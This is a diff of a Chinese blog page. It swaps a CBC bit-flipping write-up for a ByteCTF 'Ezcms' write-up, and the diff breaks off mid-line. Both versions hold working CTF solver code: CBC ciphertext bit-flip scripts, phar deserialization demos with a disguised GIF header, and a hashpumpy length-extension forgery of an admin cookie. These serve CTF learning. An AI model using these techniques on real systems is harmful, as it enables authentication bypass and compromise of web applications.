@@ -7,29 +7,35 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://glotozz.github.io">
-  <title>cbc字节翻转攻击 | ddddhm | glotozz&#39;blog</title>
+  <title>bytectf-web | ddddhm | glotozz&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="referrer" content="no-referrer">
   <!--more-->
-  <meta name="description" content="之前在看安全客的时候翻到一篇Hacker101 CTF的文章，据说在这个平台做题会有私人渗透测试邀请😀。个人感觉这里的题目比较偏实战，所以还是不错的 但是上面的都不是关键，关键是里面有一题cbc字节翻转，所以我来复习一下cbc字节翻转攻击">
-<meta name="keywords" content="cbc字节翻转攻击">
+  <meta name="description" content="这次字节跳动没做，一开始是忘了，后来就鸽了。。。😀，web题的质量不错，这里记录下web1、2，农大的大佬们tql，一结束就发了wp👍，所以跟着wp复现并记录一下">
+<meta name="keywords" content="wp">
 <meta property="og:type" content="article">
-<meta property="og:title" content="cbc字节翻转攻击">
-<meta property="og:url" content="https://glotozz.github.io/2019/08/23/cbc字节翻转攻击/index.html">
+<meta property="og:title" content="bytectf-web">
+<meta property="og:url" content="https://glotozz.github.io/2019/09/09/bytectf-web/index.html">
 <meta property="og:site_name" content="ddddhm | glotozz&#39;blog">
-<meta property="og:description" content="之前在看安全客的时候翻到一篇Hacker101 CTF的文章，据说在这个平台做题会有私人渗透测试邀请😀。个人感觉这里的题目比较偏实战，所以还是不错的 但是上面的都不是关键，关键是里面有一题cbc字节翻转，所以我来复习一下cbc字节翻转攻击">
+<meta property="og:description" content="这次字节跳动没做，一开始是忘了，后来就鸽了。。。😀，web题的质量不错，这里记录下web1、2，农大的大佬们tql，一结束就发了wp👍，所以跟着wp复现并记录一下">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://i.loli.net/2019/09/08/kKF9tnCgeWHvXbQ.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/08/xNgBCfzpKLW6yPJ.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/08/JxLRd6ZiSgEv2ph.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/08/P6jGF2gNra59w7f.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/08/e6EsG8my1nV3Rbo.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/08/vw5iDlJGNdMjVZW.png">
-<meta property="og:updated_time" content="2019-09-08T08:25:27.960Z">
+<meta property="og:image" content="https://i.loli.net/2019/09/09/gwNLdiT4pxUhSQb.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/09/ouK1nhRUCb6TJ8g.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/09/VaPOdQb5wXAyn7m.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/09/Eq2r7Oa1dHJ6wzQ.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/09/UBG4kXQfZ53WVgY.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/09/TqMxn7wgRuaEW8m.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/09/EUyx2sgK17uMvqV.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/09/ZMSdN5IxfhBatHG.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/09/LtWnRugrVcTHjy8.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/09/qG7kz5ZnMjCbyPB.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/09/V1ysnoTlDNY8SiO.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/09/h3HzDpeXqvrknT6.png">
+<meta property="og:updated_time" content="2019-09-09T14:45:45.437Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="cbc字节翻转攻击">
-<meta name="twitter:description" content="之前在看安全客的时候翻到一篇Hacker101 CTF的文章，据说在这个平台做题会有私人渗透测试邀请😀。个人感觉这里的题目比较偏实战，所以还是不错的 但是上面的都不是关键，关键是里面有一题cbc字节翻转，所以我来复习一下cbc字节翻转攻击">
-<meta name="twitter:image" content="https://i.loli.net/2019/09/08/kKF9tnCgeWHvXbQ.png">
+<meta name="twitter:title" content="bytectf-web">
+<meta name="twitter:description" content="这次字节跳动没做，一开始是忘了，后来就鸽了。。。😀，web题的质量不错，这里记录下web1、2，农大的大佬们tql，一结束就发了wp👍，所以跟着wp复现并记录一下">
+<meta name="twitter:image" content="https://i.loli.net/2019/09/09/gwNLdiT4pxUhSQb.png">
   
   
     <link rel="icon" href="https://raw.githubusercontent.com/glotozz/images/master/bitbug_favicon.ico">
@@ -154,20 +160,20 @@
           </div>
           <div id="js-content" class="content-ll">
             
-<article id="post-cbc字节翻转攻击" class="article article-type-post " itemscope itemprop="blogPost">
+<article id="post-bytectf-web" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      cbc字节翻转攻击
+      bytectf-web
     </h1>
   
 
         
-        <a href="/2019/08/23/cbc字节翻转攻击/" class="archive-article-date">
-  	<time datetime="2019-08-23T01:23:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-23</time>
+        <a href="/2019/09/09/bytectf-web/" class="archive-article-date">
+  	<time datetime="2019-09-08T22:55:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-09</time>
 </a>
         
       </header>
@@ -180,79 +186,128 @@
     <div class="article-entry" itemprop="articleBody">
       
         <blockquote>
-<p>之前在看安全客的时候翻到一篇Hacker101 CTF的文章，据说在这个平台做题会有私人渗透测试邀请😀。个人感觉这里的题目比较偏实战，所以还是不错的</p>
-<p>但是上面的都不是关键，关键是里面有一题cbc字节翻转，所以我来复习一下cbc字节翻转攻击</p>
+<p>这次字节跳动没做，一开始是忘了，后来就鸽了。。。😀，web题的质量不错，这里记录下web1、2，农大的大佬们tql，一结束就发了wp👍，所以跟着wp复现并记录一下</p>
 </blockquote>
 <meta name="referrer" content="no-referrer">
-
 <a id="more"></a>
 
-<h3 id="Encrypted-Pastebin"><a href="#Encrypted-Pastebin" class="headerlink" title="Encrypted Pastebin"></a>Encrypted Pastebin</h3><p>打开页面说是这个一个保密用户文本的web应用，因此任何黑客都无法获得未经授权的访问😂</p>
-<h5 id="简单尝试"><a href="#简单尝试" class="headerlink" title="简单尝试"></a>简单尝试</h5><p>输入11</p>
-<p>22</p>
-<p>得到</p>
-<p><img src="https://i.loli.net/2019/09/08/kKF9tnCgeWHvXbQ.png" alt="Snipaste_2019-09-08_13-50-17.png"></p>
-<p>这里post=后面的数据存在两种情况</p>
-<p>一是数据的加密</p>
-<p>二是数据库索引的加密</p>
-<p>如果是第一种，那么如果我们增加body数据的长度，对应的post=的值也会增加</p>
-<p>bp抓包修改body内容，发现并没有增加post=的长度</p>
-<p><img src="https://i.loli.net/2019/09/08/xNgBCfzpKLW6yPJ.png" alt="Snipaste_2019-09-08_13-58-36.png"></p>
-<p>修改post=的值，居然出现了第一个flag。。。即传入错误的post=值😀</p>
-<p><img src="https://i.loli.net/2019/09/08/JxLRd6ZiSgEv2ph.png" alt="Snipaste_2019-09-08_14-03-04.png"></p>
-<p>未完待续=。==！！</p>
+<h3 id="Ezcms"><a href="#Ezcms" class="headerlink" title="Ezcms"></a>Ezcms</h3><h5 id="考点：hash长度扩展攻击，phar反序列化，php自用类ZipArchive"><a href="#考点：hash长度扩展攻击，phar反序列化，php自用类ZipArchive" class="headerlink" title="考点：hash长度扩展攻击，phar反序列化，php自用类ZipArchive"></a>考点：hash长度扩展攻击，phar反序列化，php自用类ZipArchive</h5><p>hash长度扩展攻击不难，phar反序列化也在buuctf上的Dropbox接触过，可以了解一下😋</p>
+<p>先简单整理一下phar拓展反序列化漏洞</p>
 <blockquote>
-<p>先看两题之前做过的cbc字节翻转攻击。</p>
+<p>该方法在<strong>文件系统函数</strong>（file_exists()、is_dir()等）参数可控的情况下，配合<strong>phar://伪协议</strong>，可以不依赖unserialize()直接进行反序列化操作。</p>
 </blockquote>
-<h4 id="一、jarvis-OJ的xbitf"><a href="#一、jarvis-OJ的xbitf" class="headerlink" title="一、jarvis OJ的xbitf"></a>一、jarvis OJ的xbitf</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">class Unbuffered(object):</span><br><span class="line">   def __init__(self, stream):</span><br><span class="line">       self.stream = stream</span><br><span class="line">   def write(self, data):</span><br><span class="line">       self.stream.write(data)</span><br><span class="line">       self.stream.flush()</span><br><span class="line">   def __getattr__(self, attr):</span><br><span class="line">       return getattr(self.stream, attr)</span><br><span class="line">import sys</span><br><span class="line">sys.stdout = Unbuffered(sys.stdout)</span><br><span class="line">#import signal</span><br><span class="line">#signal.alarm(600)</span><br><span class="line"></span><br><span class="line">import random</span><br><span class="line">import time</span><br><span class="line">flag=open(&quot;/root/xbitf/flag&quot;,&quot;r&quot;).read()</span><br><span class="line"></span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def aes_cbc(key,iv,m):</span><br><span class="line">    handler=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    return handler.encrypt(m).encode(&quot;hex&quot;)</span><br><span class="line">def aes_cbc_dec(key,iv,c):</span><br><span class="line">    handler=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    return handler.decrypt(c.decode(&quot;hex&quot;))</span><br><span class="line"></span><br><span class="line">key=os.urandom(16)</span><br><span class="line">iv=os.urandom(16)</span><br><span class="line">session=os.urandom(8)</span><br><span class="line">token=&quot;session=&quot;+session.encode(&quot;hex&quot;)+&quot;;admin=0&quot;</span><br><span class="line">checksum=aes_cbc(key,iv,token)</span><br><span class="line">print token+&quot;;checksum=&quot;+checksum</span><br><span class="line">for i in range(10):</span><br><span class="line">    token_rcv=raw_input(&quot;token:&quot;)</span><br><span class="line">    if token_rcv.split(&quot;admin=&quot;)[1][0]==&apos;1&apos; and token_rcv.split(&quot;session=&quot;)[1][0:16].decode(&quot;hex&quot;)==session:</span><br><span class="line">        c_rcv=token_rcv.split(&quot;checksum=&quot;)[1].strip()</span><br><span class="line">        m_rcv=aes_cbc_dec(key,iv,c_rcv)</span><br><span class="line">        print m_rcv</span><br><span class="line">        if m_rcv.split(&quot;admin=&quot;)[1][0]==&apos;1&apos;:</span><br><span class="line">            print flag</span><br></pre></td></tr></table></figure>
+<p>phar文件结构可以参考链接，写的很详细。</p>
+<h4 id="举个栗子demo1（生成）"><a href="#举个栗子demo1（生成）" class="headerlink" title="举个栗子demo1（生成）"></a>举个栗子demo1（生成）</h4><blockquote>
+<p>php.ini中的<code>phar.readonly</code>选项设置为<code>Off</code>，否则无法生成phar</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">    $o = new TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>生成phar.phar，放入winhax查看</p>
+<p><img src="https://i.loli.net/2019/09/09/gwNLdiT4pxUhSQb.png" alt="Snipaste_2019-09-09_07-44-40.png"></p>
+<p>发现以序列化的形式存储，那么读取的时候必定存在反序列化。</p>
+<p>在通过phar://伪协议解析phar文件时会将meta-data（用户自定义的）反序列化的文件函数有如下：</p>
+<p><img src="https://i.loli.net/2019/09/09/ouK1nhRUCb6TJ8g.png" alt="Snipaste_2019-09-09_07-49-33.png"></p>
+<h4 id="demo2（file-get-contents-为例）"><a href="#demo2（file-get-contents-为例）" class="headerlink" title="demo2（file_get_contents()为例）"></a>demo2（file_get_contents()为例）</h4><p><img src="https://i.loli.net/2019/09/09/VaPOdQb5wXAyn7m.png" alt="Snipaste_2019-09-09_07-52-34.png"></p>
+<h4 id="demo3"><a href="#demo3" class="headerlink" title="demo3"></a>demo3</h4><blockquote>
+<p>可以修改文件头和后缀名来伪装其他格式</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头</span><br><span class="line">    $o = new TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>修改为phar.gif即可</p>
+<h4 id="总结利用条件"><a href="#总结利用条件" class="headerlink" title="总结利用条件"></a>总结利用条件</h4><ul>
+<li>phar文件能上传到服务器端</li>
+<li>存在某个可用的魔术方法作为跳板</li>
+<li>文件操作函数的参数可控，且能利用phar://协议</li>
+</ul>
+<p>本题</p>
+<p>扫描发现存在<a href="http://www.zip文件泄露" target="_blank" rel="noopener">www.zip文件泄露</a></p>
+<p>index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&apos;config.php&apos;);</span><br><span class="line">if (isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123;</span><br><span class="line">    $username = $_POST[&apos;username&apos;];</span><br><span class="line">    $password = $_POST[&apos;password&apos;];</span><br><span class="line">    $username = urldecode($username);</span><br><span class="line">    $password = urldecode($password);</span><br><span class="line">    if ($password === &quot;admin&quot;)&#123;</span><br><span class="line">        die(&quot;u r not admin !!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[&apos;username&apos;] = $username;</span><br><span class="line">    $_SESSION[&apos;password&apos;] = $password;</span><br><span class="line"></span><br><span class="line">    if (login())&#123;</span><br><span class="line">        echo &apos;&lt;script&gt;location.href=&quot;upload.php&quot;;&lt;/script&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>config.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function login()&#123;</span><br><span class="line"></span><br><span class="line">    $secret = &quot;********&quot;;</span><br><span class="line">    setcookie(&quot;hash&quot;, md5($secret.&quot;adminadmin&quot;));</span><br><span class="line">    return 1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function is_admin()&#123;</span><br><span class="line">    $secret = &quot;********&quot;;</span><br><span class="line">    $username = $_SESSION[&apos;username&apos;];</span><br><span class="line">    $password = $_SESSION[&apos;password&apos;];</span><br><span class="line">    if ($username == &quot;admin&quot; &amp;&amp; $password != &quot;admin&quot;)&#123;</span><br><span class="line">        if ($_COOKIE[&apos;user&apos;] === md5($secret.$username.$password))&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>hash长度扩展攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import hashpumpy</span><br><span class="line">import urllib</span><br><span class="line">s = &quot;52107b08c0f3342d2153ae1d68e6262c&quot;</span><br><span class="line">m=hashpumpy.hashpump(s,&apos;adminadmin&apos;,&apos;admin1&apos;,8)</span><br><span class="line">print m[0]</span><br><span class="line">print urllib.quote(m[1])</span><br></pre></td></tr></table></figure>
+
+<p>注意username和password会存在session中，所以一开始登录时(index.php)就传入admin和得到的m[1]，再上传的时候加上cookie：user=m[0]</p>
+<p><img src="https://i.loli.net/2019/09/09/Eq2r7Oa1dHJ6wzQ.png" alt="Snipaste_2019-09-09_11-27-41.png"></p>
+<p>再cookie中加上user</p>
+<p><img src="https://i.loli.net/2019/09/09/UBG4kXQfZ53WVgY.png" alt="Snipaste_2019-09-09_11-29-14.png"></p>
+<p>成功上传！！👌</p>
+<img src="https://i.loli.net/2019/09/09/TqMxn7wgRuaEW8m.png" alt="Snipaste_2019-09-09_11-29-48.png" style="zoom:60%;">
+
+
 
 <blockquote>
-<p>本地启动一下，要安装个pycrypto包</p>
+<p>以后做题一定要看清楚url，不能根据页面判断，别问我怎么知道的，我裂开了</p>
+<p><img src="https://i.loli.net/2019/09/09/EUyx2sgK17uMvqV.png" alt="BQKHHN90IQAWS0QB__SN0RP.png"></p>
 </blockquote>
-<p>cbc字节翻转攻击的原理我就不解释啦，网上很多大佬解释的很好👍</p>
-<p>这题需要我们将admin=0改成admin=1</p>
-<p>16个一组</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session=7a02c106</span><br><span class="line">b1b96ee0;admin=0</span><br></pre></td></tr></table></figure>
-
-<p>我的简单做法（手工）</p>
-<p>因为checksum进行了16进制编码，先解码，找到1对应的那一位对应的ascii^ord(‘1’)^ord(‘0’)</p>
-<p>，再16进制编码补充回去</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">checksum = &quot;af57ab62ad8e4b2a46588c278ea069d04ea7a40b1e7e773818f881d684412c76&quot;</span><br><span class="line">tmp = int(&quot;0x&quot;+checksum[30:32],16)^ord(&apos;0&apos;)^ord(&apos;1&apos;)</span><br><span class="line">checksum1 = checksum[0:30]+hex(tmp)[2:]+checksum[32:]</span><br><span class="line">print(&quot;session=7a02c106b1b96ee0;admin=1;checksum=&quot;+checksum1)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2019/09/08/P6jGF2gNra59w7f.png" alt="Snipaste_2019-09-08_14-57-34.png"></p>
-<p>给出pwn大佬的专业脚本👍</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&apos;47.97.215.88&apos;,10000)</span><br><span class="line">p.recvuntil(&apos;session=&apos;)</span><br><span class="line">session = p.recvuntil(&quot;;&quot;)[:-1]</span><br><span class="line">p.recvuntil(&quot;checksum=&quot;)</span><br><span class="line">checksum = p.recvuntil(&quot;\n&quot;)[:-1]</span><br><span class="line">temp = checksum[:32]</span><br><span class="line"></span><br><span class="line">t = ord(temp.decode(&apos;hex&apos;)[15])^ord(&apos;1&apos;)^ord(&apos;0&apos;)</span><br><span class="line">print(t)</span><br><span class="line">checksum2 = checksum[:30]+hex(t)[2:]+checksum[32:]</span><br><span class="line"></span><br><span class="line">token = &quot;session=&quot;+session+&quot;;admin=1;checksum=&quot;+checksum2</span><br><span class="line">p.recvuntil(&quot;token:&quot;)</span><br><span class="line">p.sendline(token)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h4 id="二、Bugku的login4"><a href="#二、Bugku的login4" class="headerlink" title="二、Bugku的login4"></a>二、Bugku的login4</h4><p>从cookie中的iv和cipher可以大致猜测是cbc加密，iv是初始化向量，一般是16位，这里明显进行了base64加密，cipher是加密后的密文</p>
-<p>存在文件泄露</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(&quot;SECRET_KEY&quot;, file_get_contents(&apos;/root/key&apos;));</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line">session_start();</span><br><span class="line">function get_random_iv()&#123;</span><br><span class="line">    $random_iv=&apos;&apos;;</span><br><span class="line">    for($i=0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_iv;</span><br><span class="line">&#125;</span><br><span class="line">function login($info)&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function show_homepage()&#123;</span><br><span class="line">    if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Flag is $flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123;</span><br><span class="line">    $username = (string)$_POST[&apos;username&apos;];</span><br><span class="line">    $password = (string)$_POST[&apos;password&apos;];</span><br><span class="line">    if($username === &apos;admin&apos;)&#123;</span><br><span class="line">        exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>登录成功后</p>
+<p>观察Admin类，会放用户沙箱放一个错误格式的.htaccess，导致用户会访问出现500错误</p>
+<p>如果能利用Admin类的uplaod_file()方法把这个.htaccess移走就好啦，但是这里只能move用户post上传的文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">还有一个Profile类，有个call方法，并且$admin是我们可以控制的，搜了一下PHP有个自</span><br><span class="line">用类ZipArchive，当第二个参数为ZIPARCHIVE::OVERWRITE 时，可以对已经存在的文件进行覆盖操作。</span><br><span class="line">并且可以通过File类的__destruct()触发Profile类的__call()，并且利用ZipArchive类来重写.htaccess</span><br></pre></td></tr></table></figure>
 
 <blockquote>
-<p>如果post传入username和password，如果用户名为admin直接退出，否则将我们的登录信息序列化，aes-128-cbc加密，并设置iv和cipher。如果没post传入username和password，判断cookie中是否存在cipher、iv，判断密文是否能正常解密，再反序列化等等，最后只有session中的username为admin就给我们flag</p>
+<p>搜索    ::open</p>
 </blockquote>
-<p>我们可以先构造一个</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">admim</span><br><span class="line">glotozz</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">Set-Cookie: iv=jcjqTNO7wKdcPuJsGzyiIA%3D%3D</span><br><span class="line">Set-Cookie: cipher=TGeyDeiboBvS11EpL%2FPAmab0WF81avB95n2qIBqqyw6YtTF9dHc%2BLhrzywO4xBrFO8QiGFuzCvVVmYiDLCFPvg%3D%3D</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">iv=jcjqTNO7wKdcPuJsGzyiIA==</span><br><span 